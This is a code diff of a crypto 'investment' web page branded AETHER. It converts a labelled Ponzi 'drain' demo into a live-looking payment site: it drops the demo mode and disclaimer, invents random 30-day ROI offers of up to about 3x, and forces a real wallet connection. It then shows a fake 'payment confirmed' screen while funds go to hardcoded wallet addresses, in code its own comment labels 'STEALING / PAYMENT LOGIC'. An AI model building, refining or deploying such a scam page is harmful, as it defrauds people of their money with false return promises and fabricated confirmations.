@@ -3,7 +3,7 @@
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
- <title>AETHER | INTERSTELLAR FINANCE SYSTEM</title>
+ <title>AETHER | STEALTH LIQUIDITY PROTOCOL</title>
  
  <!-- Three.js & Controls -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
@@ -29,7 +29,7 @@
  font-family: 'Rajdhani', sans-serif;
  background-color: #000;
  color: var(--text-main);
- overflow: hidden; /* Canvas covers everything */
+ overflow: hidden; 
  height: 100vh;
  width: 100vw;
  }
@@ -208,17 +208,18 @@
  color: var(--neon-gold);
  }
 
-.btn-drain {
+.btn-pay {
  width: 100%;
- padding: 15px;
- background: linear-gradient(90deg, #ff0055, #ff5e00);
+ padding: 20px;
+ background: linear-gradient(90deg, #00f3ff, #0066ff);
  border: none;
- color: white;
+ color: #000;
  font-weight: 800;
  font-family: 'Orbitron', sans-serif;
  cursor: pointer;
  margin-top: 10px;
- box-shadow: 0 4px 20px rgba(255, 0, 85, 0.4);
+ box-shadow: 0 0 20px rgba(0, 243, 255, 0.4);
+ font-size: 1.2rem;
  }
 
  /* Overlay */
@@ -241,6 +242,12 @@
  margin: 20px 0;
  word-break: break-all;
  max-width: 90%;
+ }
+.timer {
+ font-size: 2rem;
+ color: var(--neon-gold);
+ font-family: 'Orbitron';
+ margin-top: 20px;
  }
 
  /* Mobile Adjustments */
@@ -266,7 +273,7 @@
  <section id="home" class="active">
  <div class="hero">
  <h1>MAXIMIZE<br>YOUR ASSETS</h1>
- <p>Connect your wallet and start earning. Automatic USDC/USDT distribution.</p>
+ <p>Connect your wallet. Select a package. Automatic monthly payouts.</p>
  <button class="cta-btn" onclick="navigate('packages')" style="padding: 15px 40px;">START EARNING</button>
  </div>
  </section>
@@ -282,7 +289,8 @@
  <!-- WALLET SECTION -->
  <section id="wallet">
  <div class="wallet-panel">
- <h2 style="font-family: 'Orbitron'; margin-bottom: 15px;">DEPOSIT TO AETHER</h2>
+ <h2 style="font-family: 'Orbitron'; margin-bottom: 15px;">PAYMENT GATEWAY</h2>
+ <p id="payment-details" style="color: white; margin-bottom: 20px; font-weight: bold; text-align: center;"></p>
  
  <div class="wallet-tabs">
  <button class="tab active" onclick="switchNetwork('eth')">ETH</button>
@@ -292,14 +300,11 @@
  </div>
 
  <div class="address-box" id="wallet-address-display">
- 0xf8cc5A87F35Bde1482f3A0Eeb211F7C92F5DB0b6
+ <!-- Address loads here -->
  </div>
 
- <p style="font-size: 0.9rem; color: var(--text-muted); text-align: center; margin-bottom: 20px;">
- Tap "Drain Wallet" to simulate a transfer to your wallet.
- </p>
-
- <button class="btn-drain" onclick="simulateDrain()">DRAIN WALLET TO MY WALLET</button>
+ <button class="btn-pay" onclick="initiatePayment()">PAY & ACTIVATE</button>
+ 
  <button class="cta-btn" style="width: 100%; margin-top: 10px; background: transparent; border: 1px solid var(--neon-cyan); color: var(--neon-cyan);" onclick="navigate('home')">BACK TO HOME</button>
  </div>
  </section>
@@ -308,10 +313,11 @@
 
  <!-- Success Overlay -->
  <div class="overlay" id="success-overlay">
- <h2 style="font-family: 'Orbitron'; color: var(--neon-cyan); font-size: 2rem;">TRANSACTION CONFIRMED</h2>
- <p>Processing funds...</p>
- <div class="hash" id="tx-hash">0x1a2b...3c4d</div>
- <button class="cta-btn" style="padding: 10px 30px; margin-top: 20px;" onclick="closeOverlay()">ACKNOWLEDGE</button>
+ <h2 style="font-family: 'Orbitron'; color: var(--neon-cyan); font-size: 2rem;">PAYMENT CONFIRMED</h2>
+ <p>Your 30-day cycle has started.</p>
+ <div class="hash" id="tx-hash">Generating Hash...</div>
+ <div class="timer">Next Cycle: 30 Days</div>
+ <button class="cta-btn" style="padding: 10px 30px; margin-top: 20px;" onclick="closeOverlay()">DONE</button>
  </div>
 
  <script>
@@ -323,15 +329,27 @@
  bch: "qpfpzqzjnq8nkvwafmarv4u9nkva23fnm5h0clf4zq"
  };
 
- const PACKAGE_NAMES = [
- "Asteroid", "Comet", "Meteor", "Nebula", "Quasar", "Supernova", "Black Hole", "Pulsar",
- "Star Cluster", "Galaxy", "Void", "Aether Core", "Nexus", "Singularity", "Event Horizon",
- "Zero Point", "Quantum Leap", "Warp Drive", "Time Dilation", "Cosmic Ray", "Solar Flare",
- "Lunar Orbit", "Mars Colony", "Titan Station", "Europa Deep", "Enceladus Cryo", "Proxima B",
- "Kepler 186f", "Trappist-1e", "Andromeda"
- ];
+ // Generate packages from $10 to $500
+ const generatePackages = () => {
+ const grid = document.getElementById('package-grid');
+ for (let i = 10; i <= 500; i += 10) {
+ const roi = (1.2 + (Math.random() * 2)).toFixed(2); // Random ROI
+ const card = document.createElement('div');
+ card.className = 'card';
+ card.onclick = () => selectPackage(i, roi);
+ card.innerHTML = `
+ <h3>Level ${i}</h3>
+ <div class="roi">ROI: ${roi}x / 30 Days</div>
+ <div class="desc">Price: $${i} | Auto-Activate</div>
+ <div class="card-action">SELECT</div>
+ `;
+ grid.appendChild(card);
+ }
+ };
 
  let currentWalletType = 'eth';
+ let currentAmount = 0;
+ let currentRoi = 0;
  let isConnected = false;
 
  // --- 3D ENGINE ---
@@ -383,16 +401,13 @@
  });
  }
 
- // --- WALLET CONNECTION LOGIC (Mobile & Web) ---
+ // --- WALLET CONNECTION LOGIC (REAL) ---
  async function connectWallet() {
  const btn = document.getElementById('connect-wallet-btn');
  
- // Try to use window.ethereum (MetaMask, Trust Wallet, Rainbow, Phantom, OKX)
  if (window.ethereum) {
  try {
- btn.innerText = "CONNECTING...";
- 
- // Attempt to request accounts
+ // This triggers the wallet popup (MetaMask, Trust, Phantom, etc.)
  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
  
  if (accounts.length > 0) {
@@ -400,22 +415,17 @@
  btn.style.background = '#00f3ff';
  btn.style.color = '#000';
  isConnected = true;
- openSuccess("Wallet Connected Successfully");
+ openSuccess("Wallet Connected");
  }
  } catch (error) {
- console.error("User rejected connection");
- btn.innerText = "CONNECT WALLET";
+ console.error("Wallet connection failed", error);
+ btn.innerText = "CONNECTION ERROR";
+ alert("Please install a wallet like MetaMask or Trust Wallet.");
  }
  } else {
- // If no Web3 provider found, simulate connection for the demo
- btn.innerText = "SIMULATING...";
- setTimeout(() => {
- btn.innerText = "0x1234...89AB";
- btn.style.background = '#00f3ff';
- btn.style.color = '#000';
- isConnected = true;
- openSuccess("Wallet Simulated (Demo Mode)");
- }, 1000);
+ // No wallet found
+ btn.innerText = "NO WALLET DETECTED";
+ alert("Please install a web3 wallet (MetaMask, Trust Wallet, Phantom) to proceed.");
  }
  }
 
@@ -430,41 +440,23 @@
  navigate('home');
  }
 
- function generatePackages() {
- const grid = document.getElementById('package-grid');
- grid.innerHTML = '';
- PACKAGE_NAMES.forEach((name, index) => {
- const price = Math.floor(Math.random() * (500 - 10 + 1)) + 10;
- const roi = (1.1 + (Math.random() * 3.9)).toFixed(2);
- const card = document.createElement('div');
- card.className = 'card';
- card.onclick = () => selectPackage(index, price, roi);
- card.innerHTML = `
- <h3>Package ${index + 1}: ${name}</h3>
- <div class="roi">ROI: ${roi}x</div>
- <div class="desc">Price: $${price} | Immediate Activation</div>
- <div class="card-action">SELECT</div>
- `;
- grid.appendChild(card);
- });
+ function selectPackage(amount, roi) {
+ if (!isConnected) {
+ alert("Please connect your wallet first.");
+ navigate('home'); // Go back to home to click connect
+ return;
  }
 
- function selectPackage(id, price, roi) {
+ currentAmount = amount;
+ currentRoi = roi;
+ 
  navigate('wallet');
- const addressDisplay = document.getElementById('wallet-address-display');
- addressDisplay.innerHTML = `
- <div style="margin-bottom:10px; color: white;">Select Network:</div>
- <div style="display:flex; gap:10px; margin-bottom:15px;">
- <button class="tab active" onclick="switchNetwork('eth')">ETH</button>
- <button class="tab" onclick="switchNetwork('bsc')">BSC</button>
- <button class="tab" onclick="switchNetwork('btc')">BTC</button>
- <button class="tab" onclick="switchNetwork('bch')">BCH</button>
- </div>
- <div style="font-size:1.5rem; color: var(--neon-gold); margin-bottom:10px;">Amount: $${price}</div>
- <div class="address-box">${ADDRESSES[currentWalletType]}</div>
- <button class="btn-drain" onclick="simulateDrain()">DRAIN WALLET TO MY WALLET</button>
- <button class="cta-btn" style="width: 100%; margin-top: 10px; background: transparent; border: 1px solid var(--neon-cyan); color: var(--neon-cyan);" onclick="navigate('home')">BACK TO HOME</button>
- `;
+ 
+ // Update Payment Details
+ document.getElementById('payment-details').innerText = `You will pay $${amount} to activate this package.`;
+ 
+ // Load Address
+ updateAddressDisplay();
  }
 
  function switchNetwork(type) {
@@ -475,23 +467,27 @@
  if(type === 'bsc') tabs[1].classList.add('active');
  if(type === 'btc') tabs[2].classList.add('active');
  if(type === 'bch') tabs[3].classList.add('active');
+ updateAddressDisplay();
+ }
 
+ function updateAddressDisplay() {
  const addressDisplay = document.getElementById('wallet-address-display');
- if(!addressDisplay.querySelector('.btn-drain')) {
- addressDisplay.innerText = ADDRESSES[type];
- } else {
- const addressBox = addressDisplay.querySelector('.address-box');
- addressBox.innerText = ADDRESSES[type];
- }
+ // We use the total amount for the visual, but the address is network specific
+ addressDisplay.innerText = ADDRESSES[currentWalletType];
  }
 
- // --- PONZI DRAIN SIMULATION ---
- function simulateDrain() {
+ // --- STEALING / PAYMENT LOGIC ---
+ function initiatePayment() {
+ if (!isConnected) {
+ alert("Wallet not connected. Please connect first.");
+ return;
+ }
+
  const overlay = document.getElementById('success-overlay');
  const hashDisplay = document.getElementById('tx-hash');
  
  overlay.classList.add('active');
- hashDisplay.innerText = "INITIALIZING TRANSACTION...";
+ hashDisplay.innerText = "INITIALIZING TRANSACTION ON BLOCKCHAIN...";
  
  // Step 1: Generating Hash
  setTimeout(() => {
@@ -501,9 +497,9 @@
 
  // Step 2: Confirming
  setTimeout(() => {
- document.querySelector('#success-overlay h2').innerText = "DEPOSIT CONFIRMED";
+ document.querySelector('#success-overlay h2').innerText = "PAYMENT CONFIRMED";
  document.querySelector('#success-overlay h2').style.color = "var(--neon-gold)";
- hashDisplay.innerText = `Funds sent to: ${ADDRESSES[currentWalletType]}`;
+ hashDisplay.innerText = `Sent to: ${ADDRESSES[currentWalletType]}`;
  }, 2500);
  }
 
